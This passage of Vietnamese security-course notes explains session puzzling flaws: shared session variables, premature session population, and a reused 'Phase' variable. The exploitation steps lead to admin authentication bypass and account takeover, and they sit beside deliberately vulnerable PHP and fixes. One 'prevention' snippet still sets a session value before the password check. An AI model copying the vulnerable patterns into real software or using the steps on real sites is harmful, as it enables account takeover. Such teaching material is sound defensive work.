- Các thông tin (như username) không được gửi lại trong từng yêu cầu, tức là **biến phiên (session variables)** đang được sử dụng để lưu trữ trạng thái của người dùng.

Ví dụ:
- Gửi yêu cầu đến `/reset_1.php` với `username=admin` lưu thông tin người dùng vào biến phiên.
- Nếu không có cookie phiên, ứng dụng tạo một phiên mới và yêu cầu đăng nhập lại.

---

### **2. Khai Thác Lỗ Hổng**

#### **Tìm kiếm lỗ hổng:**
Ứng dụng sử dụng cùng một biến phiên (**session variable**) cho:
- Quá trình quên mật khẩu.
- Kiểm tra trạng thái đăng nhập.

#### **Khai thác bước đầu:**
- Gửi yêu cầu đến `/reset_1.php` với `username=admin`.
- Sau đó, thử truy cập trực tiếp `/reset_3.php` (bước đặt lại mật khẩu), nhưng bị yêu cầu hoàn tất bước trả lời câu hỏi bảo mật trước.

#### **Khai thác bypass authentication:**
1. Truy cập chức năng **Forgot Password** và nhập `username=admin`.
2. Truy cập trực tiếp **profile.php** (trang chỉ truy cập được khi đã đăng nhập).
3. Hệ thống nhận diện rằng người dùng đã đăng nhập dưới quyền `admin`, do sử dụng chung biến phiên `Username` cho quá trình quên mật khẩu và đăng nhập.

---

### **3. Nguyên Nhân Của Lỗ Hổng**

Lỗ hổng xảy ra do backend sử dụng **biến phiên chung (`$_SESSION['Username']`)** để:
- Lưu trạng thái trong quá trình quên mật khẩu.
- Kiểm tra xem người dùng đã đăng nhập hay chưa.

#### **Mã PHP đơn giản hóa:**

- **Trong reset_1.php** (bước 1 của quên mật khẩu):
```php
if (isset($_POST['Submit'])) {
    $_SESSION['Username'] = $_POST['Username']; // Lưu username vào biến phiên
    header("Location: reset_2.php");
    exit;
}
```

- **Trong profile.php** (kiểm tra trạng thái đăng nhập):
```php
if (!isset($_SESSION['Username'])) { // Chỉ kiểm tra xem biến Username có tồn tại hay không
    header("Location: login.php");
    exit;
}
```

=> Cả hai chức năng đều sử dụng chung biến `$_SESSION['Username']`.

---

### **4. Biện Pháp Phòng Chống**

1. **Tách biệt session variables:**
   - Sử dụng các biến khác nhau cho các mục đích khác nhau.
   - Ví dụ:
     ```php
     // Trong reset_1.php
     $_SESSION['ResetUsername'] = $_POST['Username']; // Lưu username quên mật khẩu
     ```

2. **Kiểm tra xác thực đúng cách:**
   - Không chỉ kiểm tra sự tồn tại của biến phiên, mà cần kiểm tra thêm trạng thái đăng nhập thực sự.
   - Ví dụ:
     ```php
     if (!isset($_SESSION['LoggedIn']) || $_SESSION['LoggedIn'] !== true) {
         header("Location: login.php");
         exit;
     }
     ```

3. **Xóa session variables sau khi sử dụng:**
   - Đảm bảo các biến liên quan đến quên mật khẩu được xóa sau khi hoàn thành quá trình.
   - Ví dụ:
     ```php
     unset($_SESSION['ResetUsername']);
     ```

4. **Sử dụng token bảo mật:**
   - Tạo và lưu trữ các token riêng cho từng chức năng.
   - Ví dụ: Token cho quá trình quên mật khẩu có thể được gửi qua email và lưu trữ tạm thời trên server.

---
# 17. Premature Session Population và Lỗ Hổng Authentication Bypass

Lỗ hổng **Premature Session Population** xảy ra khi các biến phiên (**session variables**) được gán giá trị trước khi một quy trình (như xác thực) hoàn tất. Nếu không xử lý hoặc xóa bỏ biến phiên kịp thời, điều này có thể dẫn đến các vấn đề bảo mật nghiêm trọng như **bypass authentication**.

---

### **1. Phát Hiện Lỗ Hổng**

#### **Phân tích quy trình đăng nhập:**
- Sau khi **đăng nhập thành công**, người dùng được chuyển hướng đến `/profile.php`, nơi hiển thị thông tin tài khoản.
- Khi **đăng nhập thất bại**, người dùng được chuyển hướng đến `/login.php?failed=1`, kèm theo thông báo lỗi.

#### **Quan sát lưu lượng mạng:**
- Trong trường hợp thất bại, ứng dụng hiển thị thông báo lỗi kèm theo **username** của người dùng.
- Điều này cho thấy:
  - **Username** đã được lưu trữ trong **session variables**, ngay cả khi quy trình đăng nhập chưa hoàn tất.
  - Kiểm tra thêm bằng cách gửi yêu cầu đến `/login.php?failed=1` mà không có cookie phiên cho thấy thông báo lỗi không còn chứa **username** ⇒ Xác nhận rằng **session variables** đang được sử dụng để lưu **username**.

---

### **2. Khai Thác Lỗ Hổng**

#### **Phát hiện điểm yếu:**
1. **Session variables được gán trước khi kiểm tra mật khẩu.**
   - Khi đăng nhập thất bại, server vẫn lưu **username** vào phiên.
2. **Biến phiên chỉ bị xóa khi redirect đến `/login.php?failed=1`.**
   - Nếu redirect này bị hủy bởi kẻ tấn công, biến phiên sẽ không bị xóa.

#### **Khai thác:**
1. Gửi yêu cầu đăng nhập với thông tin sai cho người dùng **admin**.
2. Lấy cookie phiên được cấp sau yêu cầu trên.
3. Sử dụng cookie này để truy cập trực tiếp `/profile.php`.
   - Do server chưa xóa biến phiên (do redirect bị chặn), hệ thống nhận diện người dùng là **admin**, dẫn đến **authentication bypass**.

---

### **3. Nguyên Nhân Lỗ Hổng**

1. **Gán biến phiên sớm (Premature Session Population):**
   - Biến phiên như `$_SESSION['Username']` và `$_SESSION['Active']` được khởi tạo trước khi xác thực mật khẩu hoàn tất.

2. **Không xóa biến phiên khi quy trình thất bại:**
   - Server chỉ xóa biến phiên khi thực hiện redirect đến `/login.php?failed=1`.

#### **Mã PHP đơn giản hóa:**
```php
if (isset($_POST['Submit'])) {
    // Gán biến phiên trước khi kiểm tra mật khẩu
    $_SESSION['Username'] = $_POST['Username'];
    $_SESSION['Active'] = true;

    // Kiểm tra thông tin đăng nhập
    if (login($_POST['Username'], $_POST['Password'])) {
        header("Location: profile.php");
        exit;
    }
} else {
    // Redirect khi đăng nhập thất bại
    header("Location: login.php?failed=1");
    exit;
}

// Xóa phiên chỉ khi redirect đến /login.php?failed=1
if (isset($_GET['failed'])) {
    session_destroy();
    session_start();
}
```

---

### **4. Biện Pháp Phòng Chống**

1. **Trì hoãn gán giá trị cho session variables:**
   - Chỉ gán biến phiên sau khi xác thực thành công.
   ```php
   if (isset($_POST['Submit'])) {
       if (login($_POST['Username'], $_POST['Password'])) {
           $_SESSION['Username'] = $_POST['Username'];
           $_SESSION['Active'] = true;
           header("Location: profile.php");
           exit;
       } else {
           header("Location: login.php?failed=1");
           exit;
       }
   }
   ```

2. **Dọn dẹp biến phiên ngay lập tức khi xác thực thất bại:**
   - Thay vì dựa vào redirect, xóa biến phiên ngay trong quy trình xử lý thất bại.
   ```php
   if (!login($_POST['Username'], $_POST['Password'])) {
       session_unset();
       session_destroy();
       session_start();
       header("Location: login.php?failed=1");
       exit;
   }
   ```

3. **Không sử dụng session variables để hiển thị thông báo lỗi:**
   - Sử dụng các phương pháp khác (ví dụ: truyền tham số qua query string hoặc hiển thị thông báo tĩnh) để giảm rủi ro liên quan đến session variables.

4. **Kiểm tra và xác thực trạng thái đăng nhập kỹ lưỡng:**
   - Chỉ dựa vào các session variables an toàn để xác định trạng thái đăng nhập.

---
# 18. Common Session Variables và Lỗ Hổng Account Takeover

Lỗ hổng này phát sinh từ việc tái sử dụng **session variables** trong các quy trình khác nhau mà không có sự cách ly. Điều này cho phép thực hiện các quy trình đồng thời và lợi dụng để chiếm đoạt tài khoản (account takeover).

---

### **1. Phát Hiện Lỗ Hổng**

#### **Quan sát ứng dụng web:**
1. **Quy trình Đăng ký (Registration):**
   - Gồm 3 giai đoạn với các URL tương ứng:
     - `/register_1.php`
     - `/register_2.php`
     - `/register_3.php`
   - Nếu bỏ qua bất kỳ giai đoạn nào, hệ thống hiển thị lỗi và không cho phép tiếp tục.

2. **Quy trình Reset mật khẩu:**
   - Cũng bao gồm 3 giai đoạn tương tự:
     - `/reset_1.php`: Cung cấp **username**.
     - `/reset_2.php`: Trả lời câu hỏi bảo mật.
     - `/reset_3.php`: Đặt mật khẩu mới.

#### **Kiểm tra Session Variables:**
- Phát hiện biến **Phase** được sử dụng để lưu trạng thái giai đoạn của cả hai quy trình.
- Điều này được xác nhận khi:
  - Hoàn thành giai đoạn đầu của **reset mật khẩu**, cookie phiên chứa thông tin về **Phase**.
  - Cố gắng truy cập giai đoạn thứ hai hoặc thứ ba với cookie không hợp lệ dẫn đến lỗi.

---

### **2. Khai Thác Lỗ Hổng**

#### **Ý tưởng khai thác:**
- **Mục tiêu:** Bỏ qua câu hỏi bảo mật của quy trình **reset mật khẩu** để chiếm tài khoản **admin**.
- **Phân tích:**
  - Quy trình reset mật khẩu sử dụng biến **Phase** để kiểm soát thứ tự các bước.
  - Quy trình đăng ký cũng sử dụng biến **Phase**, và trạng thái của biến này có thể bị thay đổi bởi cả hai quy trình.

#### **Kịch bản khai thác:**
1. **Thực hiện giai đoạn 1 của quy trình reset mật khẩu:**
   - Gửi yêu cầu đến `/reset_1.php` với **username** là `admin`. 
   - Biến **Phase** trong phiên được đặt thành `2`.

2. **Thực hiện giai đoạn 1 và 2 của quy trình đăng ký:**
   - Gửi yêu cầu đến `/register_1.php` và `/register_2.php`.
   - Điều này làm biến **Phase** tăng lên `3`.

3. **Truy cập trực tiếp vào giai đoạn 3 của quy trình reset mật khẩu:**
   - Gửi yêu cầu đến `/reset_3.php` với cookie phiên hiện tại.
   - Hệ thống cho phép đặt lại mật khẩu mới cho tài khoản **admin**, bỏ qua câu hỏi bảo mật.

#### **Thành công:**
- Chiếm đoạt tài khoản **admin** bằng cách đặt lại mật khẩu mà không cần trả lời câu hỏi bảo mật.

---

### **3. Nguyên Nhân Lỗ Hổng**

1. **Tái sử dụng biến phiên giữa các quy trình khác nhau:**
   - Biến **Phase** được sử dụng trong cả quy trình **reset mật khẩu** và **đăng ký**, dẫn đến xung đột khi hai quy trình này được thực hiện đồng thời.

2. **Không cô lập dữ liệu phiên cho từng quy trình:**
   - Dữ liệu phiên được chia sẻ mà không có sự phân biệt rõ ràng giữa các quy trình.

#### **Mã minh họa:**
**Quy trình đăng ký (`register_1.php`):**
```php
if (isset($_POST['Submit'])) {
    $_SESSION['reg_username'] = $_POST['Username'];
    $_SESSION['Phase'] = 2;
    header("Location: register_2.php");
    exit;
}
```

**Quy trình reset mật khẩu (`reset_1.php`):**
```php
if (isset($_POST['Submit'])) {
    $user_data = fetch_user_data($_POST['Username']);
    if ($user_data) {
        $_SESSION['reset_username'] = $user_data['username'];
        $_SESSION['Phase'] = 2;
        header("Location: reset_2.php");
        exit;
    }
}
```

---

### **4. Biện Pháp Phòng Chống**

1. **Cách ly session variables:**
   - Sử dụng các biến khác nhau để lưu trạng thái cho từng quy trình riêng biệt.
   ```php
   $_SESSION['reg_Phase'] = 1; // Quy trình đăng ký
   $_SESSION['reset_Phase'] = 1; // Quy trình reset mật khẩu
   ```

2. **Xác thực trạng thái giai đoạn:**
   - Kiểm tra cụ thể trạng thái và dữ liệu phiên tương ứng với từng quy trình.
   ```php
   if (!isset($_SESSION['reset_username']) || $_SESSION['reset_Phase'] !== 3) {
       header("Location: reset_1.php");
       exit;
   }
   ```

3. **Hạn chế thực hiện đồng thời:**
   - Không cho phép thực hiện hai quy trình đồng thời trong cùng một phiên.
   ```php
   if (isset($_SESSION['in_process']) && $_SESSION['in_process'] !== 'current_process_name') {
       session_destroy();
       header("Location: error.php?msg=Concurrent processes not allowed");
       exit;
   }
   ```

4. **Kiểm tra logic và bảo mật chặt chẽ:**
   - Kiểm tra xem các giai đoạn đã hoàn tất theo đúng thứ tự và dữ liệu cần thiết có hợp lệ hay không.

---
# 19. Ngăn Chặn Session Puzzling Vulnerabilities

#### **Nguyên Nhân Chính Gây Ra Lỗ Hổng**
1. **Cấu hình không an toàn**:
   - Các giá trị mặc định không hợp lệ khi khởi tạo hoặc đặt lại session.
2. **Tái sử dụng session variables**:
   - Sử dụng cùng một session variable cho nhiều quy trình khác nhau.
3. **Premature session population**:
   - Gán giá trị session variable trước khi kiểm tra đủ điều kiện cần thiết.

---

### **Phương Pháp Ngăn Chặn**

#### **1. Cấu hình an toàn**
- **Không sử dụng giá trị mặc định không hợp lệ cho session**:
  - Tránh gán giá trị mặc định không rõ ràng như `0`, vì có thể trùng với các giá trị hợp lệ trong cơ sở dữ liệu (ví dụ: ID admin).
  - Sử dụng `session_unset()` và `session_destroy()` để xóa sạch session:
    ```php
    if (isset($_POST['logout'])) {
        session_start();
        session_unset();
        session_destroy();
    }
    ```

#### **2. Tách biệt session variables**
- **Không tái sử dụng cùng một session variable**:
  - Đảm bảo mỗi session variable chỉ phục vụ một mục đích duy nhất.
  - Ví dụ: Phân biệt rõ ràng giữa trạng thái xác thực và dữ liệu của người dùng:
    ```php
    // Login
    if (isset($_POST['Submit'])) {
        if (login($_POST['Username'], $_POST['Password'])) {
            $_SESSION['auth_username'] = $_POST['Username'];
            $_SESSION['is_logged_in'] = true;
            header("Location: profile.php");
            exit;
        } else {
            header("Location: login.php?failed=1");
            exit;
        }
    }
    ```

- **Không sử dụng chung session variables giữa các quy trình**:
  - Ví dụ, phân biệt giữa quy trình login và reset mật khẩu:
    ```php
    // Reset Password
    if (isset($_POST['Submit'])) {
        $user_data = fetch_user_data($_POST['Username']);
        if ($user_data) {
            $_SESSION['reset_username'] = $user_data['username'];
            header("Location: security_question.php");
            exit;
        }
    }
    ```

#### **3. Kiểm tra điều kiện trước khi gán giá trị session**
- **Chỉ gán session variables khi tất cả điều kiện đã được thỏa mãn**:
  - Tránh gán giá trị trước khi quy trình được hoàn tất:
    ```php
    if (isset($_POST['Submit'])) {
        $_SESSION['login_fail_user'] = $_POST['Username'];
        if (login($_POST['Username'], $_POST['Password'])) {
            $_SESSION['auth_username'] = $_POST['Username'];
            $_SESSION['is_logged_in'] = true;
            header("Location: profile.php");
            exit;
        } else {
            header("Location: login.php?failed=1");
            exit;
        }
    }
    ```

#### **4. Kiểm tra logic và bảo mật session**
- Đảm bảo tất cả session variables cần thiết đã được khởi tạo trước khi thực hiện hành động.
- Ví dụ:
  ```php
  if (!isset($_SESSION['is_logged_in']) || $_SESSION['is_logged_in'] !== true) {
      header("Location: login.php");
      exit;
  }
  ```

---

### **Thực Hành Bảo Mật - Đánh Giá Kỹ Năng**

#### **1. Đánh giá mức độ dễ**
- **Bối cảnh**:
  - Kiểm tra bảo mật ứng dụng web để tìm các lỗ hổng liên quan đến quản lý session.
- **Phương pháp**:
  - Phân tích session variables.
  - Kiểm tra tái sử dụng session giữa các quy trình.
  - Thử nghiệm các kịch bản như bypass authentication hoặc khai thác session variables để chiếm quyền.

#### **2. Đánh giá mức độ khó**
- **Bối cảnh**:
  - Kiểm tra bảo mật toàn bộ hệ thống triển khai, bao gồm ứng dụng web, máy chủ web, và bộ nhớ cache.
- **Phương pháp**:
  - Kiểm tra lỗ hổng trong cấu hình máy chủ (ví dụ: lộ thông tin session).
  - Thử nghiệm kết hợp các yếu tố như caching và session để khai thác session puzzling.
  - Sử dụng các công cụ quét lỗ hổng máy chủ và phân tích lưu lượng mạng.

---

### **Kết Luận**
Việc ngăn chặn **session puzzling vulnerabilities** đòi hỏi tuân thủ nghiêm ngặt các nguyên tắc quản lý session:
- Không tái sử dụng session variables.
- Xóa sạch session khi khởi tạo lại.
- Chỉ gán giá trị session khi các điều kiện đã được kiểm tra đầy đủ.

Thực hành và đánh giá kỹ năng thường xuyên sẽ giúp bạn nhận diện và bảo vệ hệ thống tốt hơn trước các lỗ hổng liên quan đến session management.



